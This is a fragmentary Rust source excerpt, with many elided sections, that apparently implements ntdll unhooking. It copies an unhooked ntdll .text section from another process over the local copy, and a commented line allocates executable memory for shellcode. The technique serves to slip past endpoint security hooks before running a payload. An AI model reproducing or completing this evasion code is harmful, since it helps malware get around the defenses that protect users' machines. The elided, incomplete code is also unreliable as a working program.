use std::{ptr::{null_mut, null}, mem::transmute, collections::BTreeMap, ffi::{CStr, CString, c_void}, ops::Add};

use ntapi::{
    ntpebteb::{PPEB},
    ntpsapi::{PPEB_LDR_DATA},
    ntldr::{PLDR_DATA_TABLE_ENTRY},
    ntmmapi::{NtProtectVirtualMemory}
};
...
fn main() {
    ...
    unsafe { copy_remote_ntdll_to_local_ntdll_text_section(ntdll_addr, kernel32_addr, ".text", process_information.hProcess, k32_functions, nt_functions.to_owned()) }
    ...
    // let status = nt_avm(GetCurrentProcess() as HANDLE, &base_address, 0, shellcode_length as PVOID, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    unsafe { 
...
unsafe fn copy_remote_ntdll_to_local_ntdll_text_section(ntdll_addr: PVOID, kernel32_addr: PVOID,
    ...
    */
    ...
    res = wpm(GetCurrentProcess() as HANDLE, vaddr as PVOID, ntdll_text_section_buffer.as_mut_ptr() as PVOID, size as PVOID, &bytes_written);
    assert_eq!(res, true);
